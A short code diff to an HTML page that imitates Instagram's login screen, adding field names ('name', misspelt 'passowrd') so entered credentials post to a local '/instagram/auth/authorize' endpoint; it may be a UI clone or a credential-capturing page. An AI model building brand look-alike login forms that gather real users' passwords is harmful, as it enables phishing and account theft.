@@ -30,9 +30,9 @@
                 <div class="login__main-content">
                     <div class="login__form-wrapper">
                         <h1>Instagram</h1>
-                        <form class="login__form" action="/instagram/auth/authorize">
-                            <input type="text" placeholder="Phone number, username, or email">
-                            <input type="password" placeholder="Password">
+                        <form class="login__form" action="/instagram/auth/authorize" enctype="application/x-www-form-urlencoded">
+                            <input name='name' type="text" placeholder="Phone number, username, or email">
+                            <input name='passowrd' type="password" placeholder="Password">
                             <button>Log In</button>
                             <div class="divider">
                                 <div class="line"></div>
